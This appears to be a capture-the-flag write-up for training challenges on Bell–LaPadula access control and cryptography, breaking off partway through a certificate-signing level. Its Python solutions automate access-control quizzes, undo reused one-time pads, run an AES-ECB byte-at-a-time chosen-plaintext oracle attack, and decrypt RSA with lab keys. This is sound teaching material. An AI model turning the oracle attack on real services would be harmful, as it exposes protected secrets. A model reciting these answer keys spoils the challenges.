> Five Mandatory Access Control questions with categories

```shell
In this challenge you'll be answering questions about the category-based Bell–LaPadula model of Mandatory Access Control.

Answer the questions about the model to get the flag.


In this challenge, your goal is to answer 5 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:
4 Levels (first is highest aka more sensitive):
TS
S
C
UC
4 Categories:
ACE
NATO
NUC
UFO
Q 1. Can a Subject with level C and categories {NATO, UFO} write an Object with level C and categories {ACE, UFO}?
no
Correct!
Q 2. Can a Subject with level UC and categories {NATO, UFO} write an Object with level UC and categories {ACE, NATO, UFO}?
yes
Correct!
Q 3. Can a Subject with level C and categories {NATO, NUC, UFO} write an Object with level TS and categories {ACE, NATO}?
no
Correct!
Q 4. Can a Subject with level UC and categories {NUC} write an Object with level TS and categories {NUC}?
yes
Correct!
Q 5. Can a Subject with level TS and categories {NATO, NUC} write an Object with level TS and categories {NATO}?
no
Correct!
Congratulations, you solved this challenge!
```

#### level17
> Automate answering 20 Mandatory Access Control questions with categories in one second

```shell
In this challenge you'll be answering many questions about the category-based Bell–LaPadula model of Mandatory Access Control.

Hint: Use pwntools to interact with this process and answer the questions.
```

```python
from pwn import *
import re

p = process("/challenge/run")

p.recvuntil(b'system:\n')

level_line = p.recvline()
level_number = int(level_line.split(b' ')[0])
level = {}
for i in range(0,level_number):
    level[p.recvline()[:-1].decode()] = i

Categories_line = p.recvline()
Categories_number = int(Categories_line.split(b' ')[0])
for i in range(0,Categories_number):
    Cur_Categories = p.recvline()[:-1].decode()
    exec(Cur_Categories+f" = {i}")

pattern = r"(?:Can a Subject with level )(.*)(?: and categories )({.*})(?: )(.*)(?: an Object with level )(.*)(?: and categories )({.*})?"

def judge(q):
    res = re.findall(pattern,q.decode())
    method = res[0][2]
    level1 = res[0][0]
    level2 = res[0][3]
    cate1 = set(eval(res[0][1]))
    cate2 = set(eval(res[0][4]))

    if(method == 'read'):
        if level[level1] > level[level2]:
            return False
        if not cate2.issubset(cate1):
            return False
        return True

    else:
        if level[level1] < level[level2]:
            return False
        if not cate1.issubset(cate2):
            return False
        return True

while True:
    q = p.recvline()
    print(q.decode(),end = "")
    if b'Congratulations' in q:
        break
    if judge(q):
        print('yes')
        p.sendline(b'yes')
    else:
        print('no')
        p.sendline(b'no')
    feedback = p.recvline()
    if b'Incorrect' in feedback:
        print("error")
        exit(-1)

p.interactive()
```

#### level18
> Automate answering 64 Mandatory Access Control questions with categories in one second

same with levle17
同上

#### level19
> Automate Answering 128 Mandatory Access Control questions with random levels and categories in one second

same with levle17
同上

## Cryptography
### challenge
In this series of challenges, you will be working with various cryptographic mechanisms.

#### level1
> Decode base64-encoded data

```shell
In this challenge you will decode base64 data.
Despite base64 data appearing "mangled", it is not an encryption scheme.
It is an encoding, much like base2, base10, base16, and ascii.
It is a popular way of encoding raw bytes.
```

#### level2
> Decrypt a secret encrypted with a one-time pad, assuming a securely transferred key

```shell
In this challenge you will decrypt a secret encrypted with a one-time pad.
Although simple, this is the most secure encryption mechanism, if you could just securely transfer the key.


key (b64): HRjtTI18KTXXpoh9pX1zgxFP+ZxZouUMBnzRRSHEstzHaCFCpFiO2y9HQZg1K3a3rCVnLIbc12YtKg==
secret ciphertext (b64): bW+DYu4TRVmywe0G9B4ptkYIuMwP16xgRRj8IxWD/bnyMFA3kGnH9UsVO9ZPZjL7mXQdYv+FrTFQIA==
```

```python
import base64

key = "HRjtTI18KTXXpoh9pX1zgxFP+ZxZouUMBnzRRSHEstzHaCFCpFiO2y9HQZg1K3a3rCVnLIbc12YtKg=="
secret = "bW+DYu4TRVmywe0G9B4ptkYIuMwP16xgRRj8IxWD/bnyMFA3kGnH9UsVO9ZPZjL7mXQdYv+FrTFQIA=="

key = base64.b64decode(key)
secret = base64.b64decode(secret)

flag = ""
for i in range(len(key)):
    flag+= chr(secret[i]^key[i])

print(flag)
```

#### level3
> Decrypt a secret encrypted with a one-time pad, where the key is reused for arbitrary data

```shell
In this challenge you will decrypt a secret encrypted with a one-time pad.
You can encrypt arbitrary data, with the key being reused each time.


secret ciphertext (b64): B1F6vDejRjt6Z4ZbU1lAXl2Ji7LRbFISvHJ46fPojbPwZc7gYAk2NQHHMulAPmOHB0hFH9wce0VpAA==
plaintext (b64): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
ciphertext (b64): dyYUklTMKlcfAOMgCjsvCCTM4MqHCDtZyjABvrqr2+ahIKu1AltjG2WRSKc6cyfLMhk/UaVFARIUCg==
```

```python
import base64

secret = 'B1F6vDejRjt6Z4ZbU1lAXl2Ji7LRbFISvHJ46fPojbPwZc7gYAk2NQHHMulAPmOHB0hFH9wce0VpAA=='
secret = base64.b64decode(secret)

print(base64.b64encode(b'\0'*len(secret)))
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==

key = "dyYUklTMKlcfAOMgCjsvCCTM4MqHCDtZyjABvrqr2+ahIKu1AltjG2WRSKc6cyfLMhk/UaVFARIUCg=="
key = base64.b64decode(key)

flag = ""
for i in range(len(key)):
    flag+= chr(secret[i]^key[i])

print(flag)
```

#### level4
> Decrypt a secret encrypted with AES using the ECB mode of operation

```shell
In this challenge you will decrypt a secret encrypted with Advanced Encryption Standard (AES).
The Electronic Codebook (ECB) block cipher mode of operation is used.


key (b64): N0EJNox2NpWKmu2HM2bYRg==
secret ciphertext (b64): cg56PmUGqzUdt/Ai1MNZP4XLMypLuY+57rG5wbrUOWP3zPdtpRt5vqZe2tP67Pmrz4/h2+C8tLvXzjO73wbU/w==
```

```python
import base64
from Crypto.Cipher import AES

key = "N0EJNox2NpWKmu2HM2bYRg=="
secret = "cg56PmUGqzUdt/Ai1MNZP4XLMypLuY+57rG5wbrUOWP3zPdtpRt5vqZe2tP67Pmrz4/h2+C8tLvXzjO73wbU/w=="
key = base64.b64decode(key)
secret = base64.b64decode(secret)

aes = AES.new(key, AES.MODE_ECB )

print(aes.decrypt(secret))
```

#### level5
> Decrypt a secret encrypted with AES-ECB, where arbitrary data is appended to the secret and the key is reused. This level is quite a step up in difficulty (and future levels currently do not build on this level), so if you are completely stuck feel free to move ahead. Check out this lecture video on how to approach level 5.

```shell
In this challenge you will decrypt a secret encrypted with Advanced Encryption Standard (AES).
The Electronic Codebook (ECB) block cipher mode of operation is used.
You can encrypt arbitrary data, which has the secret appended to it, with the key being reused each time.


secret ciphertext (b64): z+IDlVYk0Dn3Hclscr9Crl+FRhl/kopRq7U/Sgt9Y80FS/Hf/A1/fb+L4cCRMv48DQnUwESEGmMNfctJzVU7Vg==
secret ciphertext (hex): cfe203955624d039f71dc96c72bf42ae 5f8546197f928a51abb53f4a0b7d63cd 054bf1dffc0d7f7dbf8be1c09132fe3c 0d09d4c044841a630d7dcb49cd553b56
plaintext prefix (b64): 

```

```python
from Crypto.Util.Padding import pad
from pwn import *
import base64

p = process("/challenge/run")

def aes_encrypt(plaintext):
    p.recvuntil(b'plaintext prefix (b64): ')
    p.sendline(base64.b64encode(plaintext))
    p.recvuntil(b'ciphertext (b64): ')
    cipher = base64.b64decode(p.recvline()[:-1])
    p.recvuntil(b'ciphertext (hex): ')
    hexcipher = (p.recvline()[:-2].decode()).split(" ")
    return cipher,hexcipher

secret = aes_encrypt(b"")
flag_len = len(secret[0])

padding_test = aes_encrypt(b'\x10'*16)
if padding_test[1][0]==secret[1][-1]:
    flag_padding = 16
else:
    for i in range(1,16):
        res = aes_encrypt(b'a'*i)
        if len(res[0]) > flag_len:
            flag_padding = i
            break

flag_len -= flag_padding
flag = ""

for i in range(flag_len):
    block = (i+1)//16 + 1
    target = aes_encrypt(b'a'*(flag_padding+i+1))
    round_success = False
    for j in range(0,256):
        senddata = chr(j)+flag[:15]
        senddata = pad(senddata.encode(),16)
        res = aes_encrypt(senddata) 
        if res[1][0]==target[1][-block]:
            flag = chr(j)+flag
            round_success = True
            break
    if round_success==False:
        print("error")
        exit(-1)
    else:
        log.success("flag : " + flag)

print(flag)
```

#### level6
> Perform a Diffie-Hellman key exchange to establish a shared secret

```shell
In this series of challenges, you will be working with various cryptographic mechanisms.

In this challenge you will perform a Diffie-Hellman key exchange.


p: 0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff
g: 0x2
A: 0xc1c09760c9dedd93dc0a15fe9af7466b23591b379bd5f17f1482e015aac5ee0417b535c64a19096c56f9bd193daa37c27ce5a320484ad9f8b66a416da09d488f4244543c57e20e5e3cb3ce716d3b5a037bd95bd5ad9dc56fe18f829a877d1441deb8c5fdfb6576a94c63e166b98bda836895c7eec6d30672d739d3e6990e74fd931f5a4038dc7b4cba8d87c3c9a3cf09ff203a7e02ae297659b0b534229e859c1fc06b9a7cf41167386560aade7b5526ea4ce319ffe1c5c581925d72597ede72c9349069d8d25efd81e9e6ebe2a0c565ed173d0fff44089a73b82ce8352d98812274184ba6d49c0c13d8af240e75ddb1ab521fd2e069ca86cc46b3ad5cd0ac7
B: 0xb53f64b421db954ff626bbe4e32e7673b9d94864be22af94ef01fc8e091b7d14d357818519fcb4a1ef388df179d1bbde84339af1b16d2aa5bc4435ce37dd229e694f3530285d4ff63f3c47b28548fb482b2c8a9a7e1c8b850d418514bf9581b181c79619ed0d6aabaf01936964f7a9a44581a3385193f3f013c8d6b0b26bcf0cb877d60b43557616c41750c8cf9af53fbf68c019786b99b36e53c3588136a08c3efa2f417cc165312aeddbee92a3206871fc73ad2eac5c19ae09c9e3499e879ff74b42792dc01618bff6569549027866717663cfa1e53b2713a2642fc5c6d6b50587c60879cb20189e50aeef85af3c794e059cd8250964e8c44d71a5e59fbd9d
secret ciphertext (b64): vvhJt4t2G/vdwh8xG5t+IYia0nFJD+p8gflyMkoEnVBHtYwshkPd3Ai35VrHMOSEH+qM/z8HlZP5EQ==
```

```python
from Crypto.Util.number import getRandomNBitInteger
from Crypto.Util.number import long_to_bytes
from Crypto.Util.strxor import strxor
import base64

p = 0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff
g = 0x2
A = 0xc1c09760c9dedd93dc0a15fe9af7466b23591b379bd5f17f1482e015aac5ee0417b535c64a19096c56f9bd193daa37c27ce5a320484ad9f8b66a416da09d488f4244543c57e20e5e3cb3ce716d3b5a037bd95bd5ad9dc56fe18f829a877d1441deb8c5fdfb6576a94c63e166b98bda836895c7eec6d30672d739d3e6990e74fd931f5a4038dc7b4cba8d87c3c9a3cf09ff203a7e02ae297659b0b534229e859c1fc06b9a7cf41167386560aade7b5526ea4ce319ffe1c5c581925d72597ede72c9349069d8d25efd81e9e6ebe2a0c565ed173d0fff44089a73b82ce8352d98812274184ba6d49c0c13d8af240e75ddb1ab521fd2e069ca86cc46b3ad5cd0ac7
b = getRandomNBitInteger(1024)
B = pow(g,b,p)
print(hex(B))

b64chiper = input("input b64chiper: ")
chiper = base64.b64decode(b64chiper)

s = pow(A,b,p)
key = s.to_bytes(256,"little")

flag = strxor(chiper,key[:len(chiper)])
print(flag)

```

#### level7
> Decrypt an RSA-encrypted secret using provided public and private keys

```shell
In this series of challenges, you will be working with various cryptographic mechanisms.

In this challenge you will decrypt a secret encrypted with RSA (Rivest–Shamir–Adleman).
You will be provided with both the public key and private key.


e: 0x10001
d: 0x69c8e5572e7909a99ecf482a5d4a6c245ee3db5ffd2833fc1ea0421a43e75869d6c415a6b36ae666e11800b8e260dbd3b8cf268bfc592ecac73d02b1238be480abacfa57ad7e012aa2abf47b656572f04f09a9659406c13c2496d4e5828d6092b240156324c5813a4092c4d5d0ce662be7d8db7bd2ce5c41d5609ab8f906683a3f5632dc5394bdcf426a8439f513f82914ac343121f59fccef286f16998010a2922b5364207774137eab956608b239baf040b113fbec410945e92a9bfeff566b4b1c27a878622fc201f50cf5374acb42aa36dda5909b3b44bcf0c08b3dfbd3010c01c87c54e549563bf056bdb132b68c25a5ac82a37a10eaaf7302c8dbc29c81
n: 0xe2794928683c255a7d1d31b03b50a984ed09046a0b3db9fd69a4265b1a8a415f7edcade6b853fa20a4d63c26f67b26bdb4a0285e38d7c8e7eeabafb3c8b6d7dd1426b8384359cdf67712d3678bdd8c5ff42cc2cfd7b1c4d0ea95341e91cda626c281c95e3fd46e1e5254cf557289aced59ec2872a7cee2dda8d8e58db2301cea181c71663bb3f5abdaae459fbc358a8d40340223c742a2b142b82eeeb53b12370f93e8bdf62a801bcc3e5a1ae8060bce87c033f3a573e65a984a301cabb29530256887c38ac69cece9abba3eac28dfb4ef1825c39295d2911dacb1bc06ae512f008bebe86b6fba9c074b481f6185a7be3e823cf577de0c8224fb788d32a736cf
secret ciphertext (b64): fFFCmUmD42Qiesdwsm9RX6dqYjjQRyqBAtMbcnnPklcslRrnHx2JjguShjB8uFN6e+r9dq6okTRZIGax4dxau85Btmj457FviQm0+sUxdTw7mmQNEir29Q2+/VrJTsQ4oV2b1ITtlzLlfC8QVRV5Qmzh857ecrboiqvDh8sj6ye1IeepnPrLm0WS/WFJNFXeZJzvctBjzSSCMx6665VjwDZnlPctFH87zoKeMWgudDfTQ2ZKaZjul7GQsqegdV//u8z5T9auBaoEQCiskWYzJDMo+2n34x24TH3ml6aTY5InuEZNX7sFG/W4WMHOtbRRIwfWqLT7/cT9BEOfIkTrYA==
```

```python
from Crypto.Util.number import long_to_bytes,bytes_to_long
import base64

e = 0x10001
d = 0x69c8e5572e7909a99ecf482a5d4a6c245ee3db5ffd2833fc1ea0421a43e75869d6c415a6b36ae666e11800b8e260dbd3b8cf268bfc592ecac73d02b1238be480abacfa57ad7e012aa2abf47b656572f04f09a9659406c13c2496d4e5828d6092b240156324c5813a4092c4d5d0ce662be7d8db7bd2ce5c41d5609ab8f906683a3f5632dc5394bdcf426a8439f513f82914ac343121f59fccef286f16998010a2922b5364207774137eab956608b239baf040b113fbec410945e92a9bfeff566b4b1c27a878622fc201f50cf5374acb42aa36dda5909b3b44bcf0c08b3dfbd3010c01c87c54e549563bf056bdb132b68c25a5ac82a37a10eaaf7302c8dbc29c81
n = 0xe2794928683c255a7d1d31b03b50a984ed09046a0b3db9fd69a4265b1a8a415f7edcade6b853fa20a4d63c26f67b26bdb4a0285e38d7c8e7eeabafb3c8b6d7dd1426b8384359cdf67712d3678bdd8c5ff42cc2cfd7b1c4d0ea95341e91cda626c281c95e3fd46e1e5254cf557289aced59ec2872a7cee2dda8d8e58db2301cea181c71663bb3f5abdaae459fbc358a8d40340223c742a2b142b82eeeb53b12370f93e8bdf62a801bcc3e5a1ae8060bce87c033f3a573e65a984a301cabb29530256887c38ac69cece9abba3eac28dfb4ef1825c39295d2911dacb1bc06ae512f008bebe86b6fba9c074b481f6185a7be3e823cf577de0c8224fb788d32a736cf
b64cipher = "fFFCmUmD42Qiesdwsm9RX6dqYjjQRyqBAtMbcnnPklcslRrnHx2JjguShjB8uFN6e+r9dq6okTRZIGax4dxau85Btmj457FviQm0+sUxdTw7mmQNEir29Q2+/VrJTsQ4oV2b1ITtlzLlfC8QVRV5Qmzh857ecrboiqvDh8sj6ye1IeepnPrLm0WS/WFJNFXeZJzvctBjzSSCMx6665VjwDZnlPctFH87zoKeMWgudDfTQ2ZKaZjul7GQsqegdV//u8z5T9auBaoEQCiskWYzJDMo+2n34x24TH3ml6aTY5InuEZNX7sFG/W4WMHOtbRRIwfWqLT7/cT9BEOfIkTrYA=="

cipher = base64.b64decode(b64cipher)
c = bytes_to_long(cipher[::-1])
m = pow(c,d,n)
flag = long_to_bytes(m)[::-1]

print(flag)
```

#### level8
> Decrypt an RSA-encrypted secret using the provided prime factors of n

```shell
In this series of challenges, you will be working with various cryptographic mechanisms.

In this challenge you will decrypt a secret encrypted with RSA (Rivest–Shamir–Adleman).
You will be provided with the prime factors of n.


e: 0x10001
p: 0xeb0eedde9f594d1b111f52728bf67e5925bf2a3bae9a30c618ac2e74865d15b758e2462dcae46926dc7ea84f383c5d21df36a75e8236055ca4c07c77e798d801ed1ca516707e284e6b129762c7ba5e42591cceaf56f170bc530fb4fe6991120fb74cc1a7826a80ca43221822559d502ab25bb5d04516e02ae20a25aa03694e45
q: 0xffb7dc5f2b9822aa854d05d9aaef7d3c84eae9cb826e78fe32d1498562e2b535931e6f49e05023ec423641f8fe850de5a7f8132d1856f2e018437c71b39e038a5e820e88db5fbe3d4a8c84a287e77d894ad3dfeffd92fa09b2c4353680130a105099b86b0d0ad71350951c3b67889ab9c1c8326d50e8f0a02b855e0a92f48d3f
secret ciphertext (b64): fwcvHfWZXTYBJXUc5Fa1qo/lgox68yZ4wnvG9PsqV2WFgKHrRxejnOKdoV8AFb4RxLGnHoYBXE/4AUsHmTIU0uffmnj4xxslpo0wwVOlXwnR7Z4mgejZnRtN2ZsfzKuWVCxnaKYbV9KCbfPe83TqqiWnnp8OwdS2UMWvAUds3G7gbyJK/JhbW5ezbk1iIK3qb5rKjYJpRtJ0fciF4EzxlzHeksAjYl19tuDQbnHO/e/A7DrTb6kJ3bdaBgCU9QqfqqzoJbzxwJMvWnQxCwCkMd5hvkTljJelLnUenJoLTMrO57+Qd1yXiMxK6eZ4R1Kzm79ZwWWRLPAdn/LjuLiXBA==
```

```python
from Crypto.Util.number import long_to_bytes,bytes_to_long
import base64
import libnum

e = 0x10001
p = 0xeb0eedde9f594d1b111f52728bf67e5925bf2a3bae9a30c618ac2e74865d15b758e2462dcae46926dc7ea84f383c5d21df36a75e8236055ca4c07c77e798d801ed1ca516707e284e6b129762c7ba5e42591cceaf56f170bc530fb4fe6991120fb74cc1a7826a80ca43221822559d502ab25bb5d04516e02ae20a25aa03694e45
q = 0xffb7dc5f2b9822aa854d05d9aaef7d3c84eae9cb826e78fe32d1498562e2b535931e6f49e05023ec423641f8fe850de5a7f8132d1856f2e018437c71b39e038a5e820e88db5fbe3d4a8c84a287e77d894ad3dfeffd92fa09b2c4353680130a105099b86b0d0ad71350951c3b67889ab9c1c8326d50e8f0a02b855e0a92f48d3f
b64cipher = "fwcvHfWZXTYBJXUc5Fa1qo/lgox68yZ4wnvG9PsqV2WFgKHrRxejnOKdoV8AFb4RxLGnHoYBXE/4AUsHmTIU0uffmnj4xxslpo0wwVOlXwnR7Z4mgejZnRtN2ZsfzKuWVCxnaKYbV9KCbfPe83TqqiWnnp8OwdS2UMWvAUds3G7gbyJK/JhbW5ezbk1iIK3qb5rKjYJpRtJ0fciF4EzxlzHeksAjYl19tuDQbnHO/e/A7DrTb6kJ3bdaBgCU9QqfqqzoJbzxwJMvWnQxCwCkMd5hvkTljJelLnUenJoLTMrO57+Qd1yXiMxK6eZ4R1Kzm79ZwWWRLPAdn/LjuLiXBA=="

cipher = base64.b64decode(b64cipher)
c = bytes_to_long(cipher[::-1])

n = p * q
phi = (p-1) * (q-1)
d = libnum.invmod(e,phi)
m = pow(c,d,n)
flag = long_to_bytes(m)[::-1]

print(flag)
```

#### level9
> Find a small hash collision using SHA256, considering only the first 2 bytes

```shell
In this challenge you will hash data with a Secure Hash Algorithm (SHA256).
You will find a small hash collision.
Your goal is to find data, which when hashed, has the same hash as the secret.
Only the first 2 bytes of the SHA256 hash are considered.


secret sha256[:2] (b64): mMQ=
collision (b64):
```

```python
import base64
from hashlib import sha256

secret = base64.b64decode("mMQ=")

for i in range(256):
    for j in range(256):
        for k in range (256):
            ans = bytes([i, j, k])
            sha256_ans = sha256(ans).digest()
            if sha256_ans[:2] == secret[:2]:
                print(base64.b64encode(ans).decode())
                break
```

#### level10
> Compute a small proof-of-work by appending response data to the challenge data, resulting in a SHA256 hash with 2 null-bytes

```shell
In this challenge you will hash data with a Secure Hash Algorithm (SHA256).
You will compute a small proof-of-work.
Your goal is to find response data, which when appended to the challenge data and hashed, begins with 2 null-bytes.


challenge (b64): P6Q7okZS0h5ckIDGB9SGOLuxd+ZBuIzWNTlToOQGYrU=
response (b64):
```

```python
from hashlib import sha256
import base64

challenge = base64.b64decode("P6Q7okZS0h5ckIDGB9SGOLuxd+ZBuIzWNTlToOQGYrU=")

i = 0
while True:
    if sha256(challenge + str(i).encode()).digest()[:2] == b"\0\0":
        print(i)
        print(base64.b64encode(str(i).encode()))
        break
    i += 1
```

#### level11
> Complete an RSA challenge-response using provided public and private keys

```shell
In this challenge you will complete an RSA challenge-response.
You will be provided with both the public key and private key.


e: 0x10001
d: 0x2a2d9ce51936251ddaabdd033214cb73750741c657dd57d5099c6fa0d53c6bb2c8db94871402ce97bd7959f15d15f30cfc018d13f146b0caebd40eb5db1d867b323d0291c0208cb5252f47ef2b4459d3a2ff91b4a2547c2c786e12eb6f679d08922b90e0d1057c7a5fe68cca785847f2f664fb8fb1fd8f314ed9aaecf78d525b1ffa0e6d175fd8e74729d94134c8a82f0dc7f1283a6d56e5894a99049eb4d0d5c1ee9758d59ff02db14cde859ffb832cc7cc64387c4178578f7e842f4928a21e7b40c99d4295ad512e579856a4b02d8380d88e56d7884280508b7a141999430bbb55eeed60f6d49fde7c552314308a42481c0dc453a1c790dd3a86660c0feb59
n: 0xe0c0a43e27a835de514134b43c876923ea537129449e9a09658b415d1f44da89ae14b7f959bad3128c1b0c0664056a2751f568356afadc362192dbe27b2b23f646110b1185087284212558138c97e30692e4c4a959617c5899950a605651cf96be8a65e006cab98a1260b8309042f239c9ec19a867046aa185e1308843521cb304516f324d48b2900903c4067e4f6fc37286d76f8a4a5d45f5bb1b3dd4afb1ae24bdbf46b52e31fc230d0ca12774538f1cbc9e3ff58a90878e103451278be8a88bd96de03bd083e16daaeafc35d6726b7084d0c6191744588579e3779f0d6eb2aaac97451239fd03c56f32d56706c1f67c000d0d050c068664a458a65af4d62f
challenge: 0xd0b3436468b8f3295c5fa753d49d58ce314bf3bab799deda1afb25e00936802518db9a902471e597391d0a19d2a80d7d32db15d7444c3cd601deecdf53400d6041e81086c13f07497765c4f122af8644c639491dbefa264f99d3efdb30bc722e775a3d6ccb462e872ef73d837f065328f7e954aed0fb1ae6db930c1bb82a04f3a68c75c9b26197142f17f0a82dbce181a86b4cacf5c96cbaf796167957562f66705fab010b2738929dd2be083a79cd03fb91cf8446356e6a94d92b8e5b873e6a0e3b6a99d604dc53e71d7501287c3a3d70fb0d6d9a6be45cbaef43b04e752537fa32f0d4eb82f5e6ce1e05e511025d7d5a63d1e170432cb6537acf7d30596af8
response:
```

```python
from Crypto.Util.number import long_to_bytes

e = 0x10001
d = 0x2a2d9ce51936251ddaabdd033214cb73750741c657dd57d5099c6fa0d53c6bb2c8db94871402ce97bd7959f15d15f30cfc018d13f146b0caebd40eb5db1d867b323d0291c0208cb5252f47ef2b4459d3a2ff91b4a2547c2c786e12eb6f679d08922b90e0d1057c7a5fe68cca785847f2f664fb8fb1fd8f314ed9aaecf78d525b1ffa0e6d175fd8e74729d94134c8a82f0dc7f1283a6d56e5894a99049eb4d0d5c1ee9758d59ff02db14cde859ffb832cc7cc64387c4178578f7e842f4928a21e7b40c99d4295ad512e579856a4b02d8380d88e56d7884280508b7a141999430bbb55eeed60f6d49fde7c552314308a42481c0dc453a1c790dd3a86660c0feb59
n = 0xe0c0a43e27a835de514134b43c876923ea537129449e9a09658b415d1f44da89ae14b7f959bad3128c1b0c0664056a2751f568356afadc362192dbe27b2b23f646110b1185087284212558138c97e30692e4c4a959617c5899950a605651cf96be8a65e006cab98a1260b8309042f239c9ec19a867046aa185e1308843521cb304516f324d48b2900903c4067e4f6fc37286d76f8a4a5d45f5bb1b3dd4afb1ae24bdbf46b52e31fc230d0ca12774538f1cbc9e3ff58a90878e103451278be8a88bd96de03bd083e16daaeafc35d6726b7084d0c6191744588579e3779f0d6eb2aaac97451239fd03c56f32d56706c1f67c000d0d050c068664a458a65af4d62f
c = 0xd0b3436468b8f3295c5fa753d49d58ce314bf3bab799deda1afb25e00936802518db9a902471e597391d0a19d2a80d7d32db15d7444c3cd601deecdf53400d6041e81086c13f07497765c4f122af8644c639491dbefa264f99d3efdb30bc722e775a3d6ccb462e872ef73d837f065328f7e954aed0fb1ae6db930c1bb82a04f3a68c75c9b26197142f17f0a82dbce181a86b4cacf5c96cbaf796167957562f66705fab010b2738929dd2be083a79cd03fb91cf8446356e6a94d92b8e5b873e6a0e3b6a99d604dc53e71d7501287c3a3d70fb0d6d9a6be45cbaef43b04e752537fa32f0d4eb82f5e6ce1e05e511025d7d5a63d1e170432cb6537acf7d30596af8

m = hex(pow(c,d,n))
print(m)
```

#### level12
> Complete an RSA challenge-response by providing the public key

```shell
In this challenge you will complete an RSA challenge-response.
You will provide the public key.

e:
```

```python
import base64

e = 0x10001
n = 0x554f65ccb6cd9db91fceb4a32bd6173b09f9324de043cc9037c2c5e7fc2bb241556c0b75787a54bbc112006a66649144abdc570c87810dd7431e09ceaa6ffb680f3306d6355719419b1e59
p = 0x84a7b001cfa7c6d9a3c200e02911dc8407b6f866b6274f2befed0ca37b45e80f1c50d25313d
q = 0xa4a20d5fd52bff62c545f5e59bec13171d23f30377eee42e8e34af89e37fb2f70951fff7b4d
d = 0xd4806263fd37519ac1d073c5c07c1a81c5e6279834faada4d0412c1921dcf6ba27be6b0cc2502e1353888f9c1c88d8027e9abb468de664629d0c6b32c0437040ce375cb2afbdb7fb90cf1

challenge = 0x503bc7acf3ed48873eb4bcc536595ab8b9c1735623fc2a20ccbb996dfcc9b5267b4c35ca7ef1427f18fd51fdb36df4c3766ef7014a041165697e83634bbefdc6
response = hex(pow(challenge,d,n))
# print(response)

secret = b"5armTxpBW9R088ISVKmp9xDOT67NLuOpbza/kW2BAIZfrjrluu15Xv3UyItjM3T8YVs/cbjYmUuxxzBLX3/hPwMegGGYlYxVfIdOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
secret = base64.b64decode(secret)

c = int.from_bytes(secret, byteorder='little')
m = pow(c,d,n)
flag =  m.to_bytes((m.bit_length() + 7) >> 3, byteorder='little')
print(flag)
```

#### level13
> Sign a user certificate using a provided self-signed root certificate and root private key

```shell
In this challenge you will work with public key certificates.
You will be provided with a self-signed root certificate.
You will also be provided with the root private key, and must use that to sign a user certificate.


root key d: 0x375eb69bcd972b471de0cfa0de19042475f267a252b5348a4733d3d3c4b0f1912c88a7bca3974a900bd7fb52bfbbb263f1cc68bf9efe5d32376dbf0577627ec078c086c7969601571c7e2f6d56f6af3b3a595e414e8628dc93aa739303c0bb17a50c8d6d488b14661454815a42c42e47d55044fe85a5e4185bb7cd4b892cbf61f0cf704e812bbf96cf86dc8e87d6f7f1884a7941e08b72869b09c88634242bbdadf767086c8e5157276c8ddcb1de9bdb3e3fe319fb5c94e9888b0679451978d1052560b120e3af96790da08c5bd0b4a641a442b0cee2de459dd763d2d09d4a14f586fdbf7dcce27a66474620da6e3bc37b0e5b03c4054b52634945118a9c601
